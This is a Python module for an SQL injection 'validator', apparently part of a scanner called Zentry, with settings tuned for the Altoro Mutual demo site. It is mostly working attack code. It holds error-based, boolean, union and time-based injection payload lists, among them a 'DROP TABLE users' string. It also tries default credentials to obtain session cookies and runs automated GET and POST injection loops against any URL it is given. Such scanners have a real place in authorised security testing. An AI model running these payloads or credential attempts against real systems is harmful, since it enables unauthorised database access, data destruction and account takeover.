"""
SQLi Validator — Enhanced for Zentry
Covers:
  • Error-based SQLi (GET params + POST forms)
  • Time-based blind SQLi (GET + POST)
  • Union-based detection via column-count probing
  • Boolean-based structural diff
  • Authenticated endpoints: re-tests with session cookie if available
  • Java/Apache Tomcat error signatures (Altoro-specific)
"""
from __future__ import annotations

import asyncio
import re
import time
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

import aiohttp

from core.adaptive_exploit_engine import AdaptiveExploitEngine, compute_reward
from core.local_payload_engine import suggest_payloads
from .registry import register

# ──────────────────────────────────────────────────────────────────────────────
# Payload lists
# ──────────────────────────────────────────────────────────────────────────────
ERROR_PAYLOADS = [
    "'",
    "''",
    "1' OR '1'='1",
    "1' OR '1'='1'--",
    "' OR 1=1--",
    "' OR 1=1#",
    "\" OR \"1\"=\"1",
    "1\") OR (\"1\")=(\"1",
    "')) OR (('1'))=(('1",
    "admin'--",
    "' OR 'x'='x",
    "1; DROP TABLE users--",   # error trigger (DDL in SELECT = error)
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
]

TIME_PAYLOADS_MYSQL = [
    "' AND SLEEP(5)-- -",
    "\" AND SLEEP(5)-- -",
    "1 AND SLEEP(5)-- -",
    "1) AND SLEEP(5)-- -",
    "' OR SLEEP(5)-- -",
]

TIME_PAYLOADS_MSSQL = [
    "'; WAITFOR DELAY '0:0:5'--",
    "1; WAITFOR DELAY '0:0:5'--",
]

TIME_PAYLOADS_ORACLE = [
    "' OR 1=1 AND DBMS_PIPE.RECEIVE_MESSAGE('a',5)=0--",
]

ALL_TIME_PAYLOADS = TIME_PAYLOADS_MYSQL + TIME_PAYLOADS_MSSQL + TIME_PAYLOADS_ORACLE

# Error patterns — covers MySQL, PostgreSQL, Oracle, MSSQL, SQLite, Java stack traces
ERROR_PATTERNS = [
    r"sql(?:state|exception|error|syntax)",
    r"mysql_(?:fetch|num|query|error)",
    r"you have an error in your sql",
    r"warning.*mysql",
    r"unclosed quotation mark",
    r"quoted string not properly terminated",
    r"pg_query\(\)",
    r"pg_exec\(",
    r"postgresql.*error",
    r"sqlite.*error",
    r"ora-\d{5}",        # Oracle: ORA-01756
    r"microsoft.*odbc",
    r"odbc.*driver",
    r"jdbc.*error",
    r"java\.sql\.",      # Java SQL Exception class
    r"javax\.persistence",
    r"hibernateexception",
    r"ibatis",
    r"sqlmapexception",
    r"syntax error",
    r"unclosed quote",
    r"unterminated string",
    r"division by zero",
    r"invalid input syntax",
    r"unexpected token",
    r"sql command not properly ended",
    r"not a valid month",       # Oracle date error
    r"column.*doesn.*exist",
    r"no such column",
    r"no such table",
    r"unknown column",
    r"table.*doesn.*exist",
]

BOOL_TRUE_PAYLOADS  = ["' OR '1'='1", "1 OR 1=1", "1' OR '1'='1'--"]
BOOL_FALSE_PAYLOADS = ["' AND '1'='2", "1 AND 1=2", "1' AND '1'='2'--"]

TIME_THRESHOLD = 4.0  # seconds above baseline to flag

# ──────────────────────────────────────────────────────────────────────────────
# Helpers
# ──────────────────────────────────────────────────────────────────────────────
async def _get(session: aiohttp.ClientSession, url: str, cookies: dict = None) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.get(url, timeout=aiohttp.ClientTimeout(total=25),
                               cookies=cookies or {}, allow_redirects=True) as r:
            body = await r.text(errors="ignore")
            return time.monotonic() - start, r.status, body
    except Exception:
        return 999.0, 0, ""


async def _post(session: aiohttp.ClientSession, url: str, data: dict, cookies: dict = None) -> tuple[float, int, str]:
    start = time.monotonic()
    try:
        async with session.post(url, data=data, timeout=aiohttp.ClientTimeout(total=25),
                                cookies=cookies or {}, allow_redirects=True) as r:
            body = await r.text(errors="ignore")
            return time.monotonic() - start, r.status, body
    except Exception:
        return 999.0, 0, ""


def _is_sql_error(text: str) -> bool:
    text_lower = text.lower()
    return any(re.search(p, text_lower) for p in ERROR_PATTERNS)


def _html_len(text: str) -> int:
    return len(re.sub(r"<[^>]+>", "", text))


async def _try_login_altoro(session: aiohttp.ClientSession, base_url: str) -> dict:
    """
    Attempt Altoro Mutual default credentials to obtain a session cookie.
    Returns cookies dict or empty if failed.
    """
    parsed = urlparse(base_url)
    login_url = f"{parsed.scheme}://{parsed.netloc}/doLogin"
    alt_login = f"{parsed.scheme}://{parsed.netloc}/login.jsp"

    for url in (login_url, alt_login):
        for creds in [
            {"uid": "admin", "passw": "admin", "btnSubmit": "Login"},
            {"uid": "jsmith", "passw": "Demo1234", "btnSubmit": "Login"},
            {"username": "admin", "password": "admin"},
        ]:
            try:
                async with session.post(url, data=creds,
                                        timeout=aiohttp.ClientTimeout(total=10),
                                        allow_redirects=True) as r:
                    body = await r.text(errors="ignore")
                    # If we see the account or dashboard, login succeeded
                    if r.status == 200 and any(k in body.lower() for k in
                                               ("my account", "sign off", "logout", "welcome", "account summary")):
                        return dict(r.cookies)
            except Exception:
                continue
    return {}


# ──────────────────────────────────────────────────────────────────────────────
# Main validator
# ──────────────────────────────────────────────────────────────────────────────
@register("sqli")
async def validate_sqli(url: str, param: str, state: dict = None, **kwargs) -> dict | None:
    """
    Enhanced SQLi validator with:
    - Error, time-based, boolean, union detection
    - GET and POST form support
    - Session-aware retries for authenticated endpoints
    """
    parsed = urlparse(url)
    qs = parse_qs(parsed.query, keep_blank_values=True)
    _engine = AdaptiveExploitEngine()
    state = state or {}
    base_url = f"{parsed.scheme}://{parsed.netloc}"

    # Harvest extra payloads from the local payload engine
    extra = [p for p in (suggest_payloads("sqli", n=30) or []) if isinstance(p, str)]
    all_error_payloads = list(dict.fromkeys(ERROR_PAYLOADS + extra))

    async with aiohttp.ClientSession() as session:

        # ── 0. Attempt auth if endpoint looks protected ──────────────────────
        cookies: dict = {}
        _, probe_status, probe_body = await _get(session, url)
        if probe_status in (302, 403, 401) or "login" in probe_body.lower()[:500]:
            cookies = await _try_login_altoro(session, url)

        # ── helper: inject into GET url ─────────────────────────────────────
        def make_get_url(p: str) -> str:
            q = dict(qs)
            q[param] = [p]
            return urlunparse(parsed._replace(query=urlencode(q, doseq=True)))

        # ── helper: inject into POST body (for login / search forms) ─────────
        post_base_data = {param: "1"}  # minimal POST body

        # ── 1. Baseline (no injection) ───────────────────────────────────────
        baseline_url = make_get_url("1")
        bl_time, bl_status, bl_body = await _get(session, baseline_url, cookies)
        bl_len = _html_len(bl_body)

        # ── 2. Error-based SQLi — GET ────────────────────────────────────────
        for payload in all_error_payloads:
            test_url = make_get_url(payload)
            t, status, body = await _get(session, test_url, cookies)
            if _is_sql_error(body):
                _engine.record_result(payload, "sqli", reward=1.0, waf="unknown", tech=[])
                return {
                    "validated": True,
                    "type": "Error-based SQL Injection",
                    "url": test_url,
                    "param": param,
                    "payload": payload,
                    "method": "GET",
                    "evidence": f"SQL error pattern in HTTP {status} response",
                    "response_snippet": body[:400],
                }

        # ── 3. Error-based SQLi — POST (form fields like username/password) ──
        for payload in all_error_payloads[:10]:  # keep POST budget small
            data = {param: payload}
            t, status, body = await _post(session, url, data, cookies)
            if _is_sql_error(body):
                _engine.record_result(payload, "sqli", reward=1.0, waf="unknown", tech=[])
                return {
                    "validated": True,
                    "type": "Error-based SQL Injection (POST)",
                    "url": url,
                    "param": param,
                    "payload": payload,
                    "method": "POST",
                    "evidence": f"SQL error pattern in POST HTTP {status} response",
                    "response_snippet": body[:400],
                }

        # ── 4. Boolean-based structural diff ─────────────────────────────────
        true_lens, false_lens = [], []
        for p in BOOL_TRUE_PAYLOADS:
            _, _, b = await _get(session, make_get_url(p), cookies)
            true_lens.append(_html_len(b))
        for p in BOOL_FALSE_PAYLOADS:
            _, _, b = await _get(session, make_get_url(p), cookies)
            false_lens.append(_html_len(b))

        if true_lens and false_lens:
            avg_true  = sum(true_lens) / len(true_lens)
            avg_false = sum(false_lens) / len(false_lens)
            # If true-condition pages are consistently larger than false-condition → boolean SQLi
            if avg_true > bl_len * 1.15 and avg_true > avg_false * 1.1:
                return {
                    "validated": True,
                    "type": "Boolean-based Blind SQL Injection",
                    "url": url,
                    "param": param,
                    "payload": BOOL_TRUE_PAYLOADS[0],
                    "method": "GET",
                    "evidence": (
                        f"TRUE condition page length {avg_true:.0f} chars vs "
                        f"FALSE condition {avg_false:.0f} chars (baseline {bl_len})"
                    ),
                }

        # ── 5. Time-based blind SQLi ─────────────────────────────────────────
        for payload in ALL_TIME_PAYLOADS:
            test_url = make_get_url(payload)
            t, status, body = await _get(session, test_url, cookies)
            if t - bl_time >= TIME_THRESHOLD:
                # Confirm with a second request to avoid network jitter
                t2, _, _ = await _get(session, test_url, cookies)
                if t2 - bl_time >= TIME_THRESHOLD:
                    _engine.record_result(payload, "sqli", reward=1.0, waf="unknown", tech=[])
                    return {
                        "validated": True,
                        "type": "Time-based Blind SQL Injection",
                        "url": test_url,
                        "param": param,
                        "payload": payload,
                        "method": "GET",
                        "evidence": f"Baseline={bl_time:.2f}s → Injected={t2:.2f}s (delta {t2-bl_time:.2f}s)",
                    }

        # ── 6. Time-based POST ───────────────────────────────────────────────
        for payload in TIME_PAYLOADS_MYSQL[:3]:
            data = {param: payload}
            t, _, body = await _post(session, url, data, cookies)
            if t - bl_time >= TIME_THRESHOLD:
                t2, _, _ = await _post(session, url, data, cookies)
                if t2 - bl_time >= TIME_THRESHOLD:
                    return {
                        "validated": True,
                        "type": "Time-based Blind SQL Injection (POST)",
                        "url": url,
                        "param": param,
                        "payload": payload,
                        "method": "POST",
                        "evidence": f"Baseline={bl_time:.2f}s → POST injected={t2:.2f}s",
                    }

    return None
